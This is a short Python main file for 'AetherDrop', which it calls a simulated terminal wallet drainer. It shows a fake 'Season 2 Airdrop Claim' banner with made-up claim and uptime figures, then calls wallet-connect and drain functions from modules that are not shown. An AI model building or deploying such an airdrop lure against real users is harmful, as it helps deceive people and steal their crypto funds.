"""
AetherDrop — terminal wallet drainer demo. Simulation only.

Run:
    pip install rich
    python main.py
"""
from rich.align import Align
from rich.console import Console
from rich.text import Text

import config
import keepalive  # placeholder module, main runs into it
from ui import clear_screen, render_hero, render_error
from wallets import connect_flow
from drainer import run_drain
from receipt import show_receipt


BANNER = r"""
████████▄     ▄████████    ▄████████  ▄█  ███▄▄▄▄      ▄████████    ▄████████
███   ▀███   ███    ███   ███    ███ ███  ███▀▀▀██▄   ███    ███   ███    ███
███    ███   ███    ███   ███    ███ ███▌ ███   ███   ███    █▀    ███    ███
███    ███  ▄███▄▄▄▄██▀   ███    ███ ███▌ ███   ███  ▄███▄▄▄      ▄███▄▄▄▄██▀
███    ███ ▀▀███▀▀▀▀▀   ▀███████████ ███▌ ███   ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀
███    ███ ▀███████████   ███    ███ ███  ███   ███   ███    █▄  ▀███████████
███   ▄███   ███    ███   ███    ███ ███  ███   ███   ███    ███   ███    ███
████████▀    ███    ███   ███    █▀  █▀    ▀█   █▀    ██████████   ███    ███
             ███    ███                                            ███    ███
"""


console = Console()


def print_banner() -> None:
    banner   = Text(BANNER, style="bold bright_magenta")
    subtitle = Text("AetherDrop · Season 2 Airdrop Claim", style="bold bright_white")
    badge    = Text("  ◆ live · 12,847 claimed · 99.4% uptime  ",
                    style="black on bright_yellow")
    console.print(Align.center(banner))
    console.print(Align.center(subtitle))
    console.print(Align.center(badge))
    console.print()


def main() -> None:
    clear_screen()
    print_banner()
    render_hero(console)

    wallet = connect_flow(console)
    if wallet is None:
        render_error(console, "Connection cancelled.")
        return

    state = config.build_wallet_state(wallet)

    result = run_drain(console, state)
    if result is None:
        render_error(console, "Drain aborted.")
        return

    show_receipt(console, result)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[dim]aborted.[/dim]\n")
